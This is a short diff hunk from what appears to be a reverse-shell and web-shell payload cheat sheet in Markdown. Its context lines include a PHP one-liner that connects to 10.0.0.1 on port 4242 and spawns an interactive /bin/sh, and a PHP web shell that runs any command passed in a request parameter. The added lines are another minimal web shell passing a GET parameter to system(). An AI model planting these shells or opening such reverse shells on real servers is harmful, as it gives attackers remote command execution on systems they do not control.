@@ -63,6 +63,12 @@ php -r '$sock=fsockopen("10.0.0.1",4242);$proc=proc_open("/bin/sh -i", array(0=>
 ```
 
 ```
+<?php
+	system($_GET[0]);
+?>
+```
+
+```
 <?php echo "<pre>"; $cmd=($_REQUEST['cmd']); system($cmd); ?>
 ```
 
